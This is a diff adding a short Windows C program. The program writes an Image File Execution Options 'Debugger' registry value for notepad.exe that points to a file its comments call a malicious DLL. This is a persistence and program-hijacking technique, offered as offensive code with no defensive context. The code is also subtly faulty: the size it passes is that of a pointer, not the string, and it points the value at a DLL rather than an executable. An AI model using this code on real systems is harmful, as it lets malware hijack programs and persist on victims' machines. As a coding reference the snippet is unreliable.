@@ -1,0 +1,19 @@
+#include <Windows.h>
+#include <TlHelp32.h>
+
+int main()
+{
+    HKEY hKey;
+    LPCTSTR subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
+    LPCTSTR value = "Debugger";
+    LPCTSTR data = "C:\\malware.dll";
+    DWORD dwSize = sizeof(data);
+
+    // create or open the IFEO registry key
+    RegCreateKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+
+    // set the Debugger value to the path of the malicious DLL
+    RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)data, dwSize);
+
+    RegCloseKey(hKey);
+}
